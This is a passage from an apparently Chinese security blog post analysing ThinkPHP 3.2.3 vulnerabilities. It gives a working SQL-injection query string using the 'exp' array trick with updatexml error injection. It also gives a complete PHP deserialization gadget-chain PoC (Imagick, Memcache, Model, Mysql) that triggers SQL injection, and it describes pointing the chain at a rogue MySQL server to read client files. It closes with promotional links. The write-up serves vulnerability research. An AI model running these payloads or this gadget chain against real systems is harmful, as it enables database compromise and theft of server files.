            }
            foreach($filters as $filter){
                if(function_exists($filter)) {
                    $data   =   is_array($data)?array_map_recursive($filter,$data):$filter($data); // 参数过滤
                }else{
                    $data   =   filter_var($data,is_int($filter)?$filter:filter_id($filter));
                    if(false === $data) {
                        return   isset($default)?$default:NULL;
                    }
                }
            }
        }
    }else{ // 变量默认值
        $data       =    isset($default)?$default:NULL;
    }
```

那么可以看到这里是没有任何有效的过滤的 即时是 filter_exp, 如果写的是

filter_exp 在 I 函数的 fiter 之前，所以如果开发者这样写 I(‘get.id’, ‘’, ‘trim’)，那么会直接清除掉 exp 后面的空格，导致过滤无效。

返回：

```
}else {
                $whereStr .= $key.' = '.$this->parseValue($val);
            }
        }
        return $whereStr;
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1icEicoPgzOic6o7MXEFAGYicR62yU2ZMVVia7Xhhfhl75HnoVbhwlgZMYWA/640?wx_fmt=png)

###### 漏洞复现

直接在 IndexController.class.php 中创建一个测试代码

```
public function index(){
        $map=array();
        $map['id']=$_GET['id'];
        $data=M('users')->where($map)->find();
        dump($data);
    }
```

数据库配置：

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1qqdiaOqtpjYtNs2icuG4fY5QzLkSOyFMpGlgd6mMLFdrZZlZXhQ1s9ZA/640?wx_fmt=png)

Poc：  
?id[0]=exp&id[1]==updatexml(0,concat(0x0e,user(),0x0e),0)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC17QlkGO9VsLibWozFUnictuY6o9F37kOJzG5yvGQZ1SGFXuEFg4MrqCkQ/640?wx_fmt=png)

#### 三. 反序列化

##### thinkphp3.2.3 反序列化漏洞

###### 漏洞分析

首先全局搜索 **destruct， 这里的 $this->img 可控，可以利用其来调用 其他类的 destroy() 方法，或者可以用的** call() 方法，__call() 方法并没有可以利用的

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1ZAF61w8JY6QsibJndQN59Gox4aaotN9QKhhGXvkxODGfA2zuFoYX4dQ/640?wx_fmt=png)  
那就去找 destroy() 方法。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1AFx1UVFfRAaRIHuwSwElzfmwNUJzhkrz5T6MITfqIwibia8Yiat9HceMw/640?wx_fmt=png)  

注意这里，destroy() 是有参数的，而我们调用的时候没有传参，这在 php5 中是可以的，只发出警告，但还是会执行。

但是在 php7 里面就会报出错误，不会执行。

所以漏洞需要用 php5 的环境。

继续寻找可利用的 delete() 方法。

在 Think\Model 类即其继承类里，可以找到这个方法，还有数据库驱动类中也有这个方法的，thinkphp3 的数据库模型类的最终是会调用到数据库驱动类中的。

先看 Model 类中。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC17YibP3vPibvCvg8Ows8LOdA8prv8yN6aosZqylicxM6iaiaWt2csHw3VcbQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1pgxicAnl6J8d5lMU6zfAyibmZFiaIrZibzu7T4sWFnf4oek0p6zWRLwMOA/640?wx_fmt=png)  
还需要注意这里！！如果没有 $options[‘where’] 会直接 return 掉。

跟进 getPK() 方法

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1CvptAXLicLNbqcLD7dW4Mpnwf3jnWU3JXqbrXCBsr1Daic8dGeS05UYg/640?wx_fmt=png)

$pk 可控 $this->data 可控 。

最终去驱动类的入口在这里

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1lUPO36lPvIXxUVVDaSYia1dNib0v8ArVXKkdvbLiaStiaeIPibGFmqwrmVQ/640?wx_fmt=png)  
下面是驱动类的 delete 方法

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1HPA2VHFSP4LCBsVGM9CDthnM7sjdGBjhrXyMc3d3GbNiagj2ZibjMnQw/640?wx_fmt=png)  
我们在一开始调用 Model 类的 delete 方法的时候，传入的参数是

```
$this->sessionName.$sessID
```

而后面我们执行的时候是依靠数组的，数组是不可以用 字符串连接符的。参数控制不可以利用 $this->sessionName。

但是可以令其为空（本来就是空），会进入 Model 类中的 delete 方法中的第一个 if 分支，然后再次调用 delete 方法，把 $this->data[$pk] 作为参数传入，这是我们可以控制的！

看代码也不难发现注入点是在 $table 这里，也就是 $options[‘table’]，也就是 $this->data[$this->pk[‘table’]];

直接跟进 driver 类中的 execute() 方法

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1SkwuBibKCVicT28h1qYiaKrkZbicY8tyF86WsXvy3iaDuY6K8OsgJPvk1RA/640?wx_fmt=png)  
跟进 initConnect() 方法

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1FtZaJbicJKGGojkWafq1H5TuAHtBtDVPaibtibuPHp0HyJA3IxoVKRYFQ/640?wx_fmt=png)  
跟进 connect() 方法

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1Re3gUOTw4qXv7WUdt2h8K8fGaMSGicf8gBeR6N5Hceuhl0BRiaXBtejw/640?wx_fmt=png)  
数据库的连接时通过 PDO 来实现的，可以堆叠注入 (PDO::MYSQL_ATTR_MULTI_STATEMENTS => true ) 需要指定这个配置。

这里控制 $this->config 来连接数据库。

driver 类时抽象类，我们需要用 mysql 类来实例化。

到这里一条反序列化触发 sql 注入的链子就做好了。

###### 漏洞复现

poc

```
<?php
namespace Think\Image\Driver;
use Think\Session\Driver\Memcache;
class Imagick{
    private $img;
    public function __construct(){
        $this->img = new Memcache();
    }
}
namespace Think\Session\Driver;
use Think\Model;
class Memcache {
    protected $handle;
    public function __construct(){
        $this->sessionName=null;
        $this->handle= new Model();
    }
}
namespace Think;
use Think\Db\Driver\Mysql;
class Model{
    protected $pk;
    protected $options;
    protected $data;
    protected $db;
    public function __construct(){
        $this->options['where']='';
        $this->pk='jiang';
        $this->data[$this->pk]=array(
            "table"=>"mysql.user where 1=updatexml(1,concat(0x7e,user()),1)#",
            "where"=>"1=1"
        );
        $this->db=new Mysql();
    }
}
namespace Think\Db\Driver;
use PDO;
class Mysql{
    protected $options ;  
    protected $config ;
    public function __construct(){
        $this->options= array(PDO::MYSQL_ATTR_LOCAL_INFILE => true );   // 开启才能读取文件
        $this->config= array(
            "debug"    => 1,
            "database" => "mysql",
            "hostname" => "127.0.0.1",
            "hostport" => "3306",
            "charset"  => "utf8",
            "username" => "root",
            "password" => "root"
        );
        }
}
use Think\Image\Driver\Imagick;
echo base64_encode(serialize(new Imagick()));
```

这里可以连接任意服务器，所以还有一种利用方式，就是 MySQL 恶意服务端读取客户端文件漏洞。

利用方式就是我们需要开启一个恶意的 mysql 服务，然后让客户端去访问的时候，我们的恶意 mysql 服务就会读出客户端的可读文件。

这里的 hostname 是开启的恶意 mysql 服务的地址以及 3307 端口

  
下面搭建恶意 mysql 服务

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1u3THh4OAuF2UfBZBDwjfVoUN4PEWypI3hY8MSr5wmialbP9M7QoZCLg/640?wx_fmt=png)  
修改 port 和 filelist

执行 python 脚本后，发包，触发反序列化后，就会去连接恶意服务器，然后把客户端下的文件带出来。

下面就是 mysql.log 中的 文件信息 (flag.txt)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1D8uCv7cWX6E4BOEsweFp0S7ia92Xbk9sYvvqamIK9Vx7y0JAcCTEM0A/640?wx_fmt=png)  
当脚本处于运行中的时候，我们只可以读取第一次脚本运行时定义的文件，

因为 mysql 服务已经打开了，我们需要关闭 mysql 服务，然后才可以修改脚本中的其他文件。

```
ps -ef|grep mysql
```

然后依次 kill 就好。

  

**回顾往期内容**

[公益 SRC 怎么挖 | SRC 上榜技巧](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247496984&idx=1&sn=ccf9cf7193235d4a6e189198a9f8359c&chksm=fa6b8c69cd1c057f605e587c8578eac81313039a754c285e731a89b374dcbc57c0cba4434e23&scene=21#wechat_redirect)

[实战纪实 | SQL 漏洞实战挖掘技巧](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247497717&idx=1&sn=34dc1d10fcf5f745306a29224c7c4008&chksm=fa6b8e84cd1c0792f0ec433310b24b4ccbe53354c11f334a1b0d5f853d214037bdba7ea00a9b&scene=21#wechat_redirect)

[上海长亭科技安全服务工程师面试经验分享](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247501917&idx=1&sn=f194da03379f55e1a79bd34b39ecdfc6&chksm=fa6bb12ccd1c383a30b798185114462798d1ac8363c2aabb7fdb2529891b5a0440f886d462f4&scene=21#wechat_redirect)

[实战纪实 | 从编辑器漏洞到拿下域控 300 台权限](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487476&idx=1&sn=ac9761d9cfa5d0e7682eb3cfd123059e&chksm=fa687685cd1fff93fcc5a8a761ec9919da82cdaa528a4a49e57d98f62fd629bbb86028d86792&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[代理池工具撰写 | 只有无尽的跳转，没有封禁的 IP！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503462&idx=1&sn=0b696f0cabab0a046385599a1683dfb2&chksm=fa6bb717cd1c3e01afc0d6126ea141bb9a39bf3b4123462528d37fb00f74ea525b83e948bc80&scene=21#wechat_redirect)
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif)

扫码白嫖视频 + 工具 + 进群 + 靶场等资料

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpx1Q3Jp9iazicHHqfQYT6J5613m7mUbljREbGolHHu6GXBfS2p4EZop2piaib8GgVdkYSPWaVcic6n5qg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWFyt1RHHuwgcQ5iat5ZXkETlp2icotQrCMuQk8HSaE9gopITwNa8hfI7A/640?wx_fmt=png)

 **扫码白嫖****！**

 **还有****免费****的配套****靶场****、****交流群****哦！**
